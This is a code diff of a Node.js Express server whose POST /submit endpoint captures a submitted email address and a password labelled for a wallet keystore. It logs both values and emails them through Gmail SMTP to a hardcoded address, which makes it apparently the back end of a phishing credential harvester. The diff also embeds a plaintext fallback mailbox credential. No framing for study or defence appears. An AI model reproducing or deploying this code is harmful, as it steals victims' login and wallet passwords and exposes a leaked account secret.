@@ -1,45 +1,60 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
-const cors = require('cors');
+const bodyParser = require('body-parser');
+const path = require('path');
 
 const app = express();
-const port = process.env.PORT;
+const port = process.env.PORT || 3000;
 
-app.use(cors());
-app.use(express.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
 
-app.post('/submit', (req, res) => {
-  const { wName, psdWet } = req.body;
+app.use(express.static(path.join(__dirname, 'public')));
 
-  const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS
-      }
-  });
+const maillist = [
+  'willyscotmegan@gmail.com',
+];
 
-  const mailOptions = {
-    from: 'willyscotmegan@gmail.com',
-    to: 'willyscotmegan@gmail.com',
-    subject: 'NwDeets',
-    text: `
-      eml: ${wName}
-      Psd: ${psdWet}
-    `
-  };
+const transporter = nodemailer.createTransport({
+  host: "smtp.gmail.com",
+  port: 465,
+  secure: true,
+  auth: {
+    user: process.env.EMAIL_USER || "willyscotmegan@gmail.com",
+    pass: process.env.EMAIL_PASS || "jubtgphwdbkrrauf",
+  },
+});
 
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.error(error);
-      res.status(500).send('ErrSndgeml');
-    } else {
-      console.log('EmSt: ' + info.response);
-      res.status(200).send('EmlSntScsfl!');
-    }
-  });
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.post('/submit', async (req, res) => {
+  try {
+    console.log('Srcvd:', req.body);
+
+    const { wName, psdWet } = req.body;
+
+    const mailOptions = {
+      from: '"Deets" <willyscotmegan@gmail.com>',
+      to: maillist,
+      html: `
+        <p><strong>Eml:</strong> ${wName || 'Not provided'}</p>
+        <p><strong>Pswd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
+      `
+    };
+
+    const info = await transporter.sendMail(mailOptions);
+
+    res.status(200).send('Wdestscesful');
+  } catch (error) {
+    console.error('err', error);
+    res.status(500).send('Errwetdets');
+  }
 });
 
 app.listen(port, () => {
-  console.log(`Serlstprt ${port}`);
+  console.log(``);
 });
+
+module.exports = app;
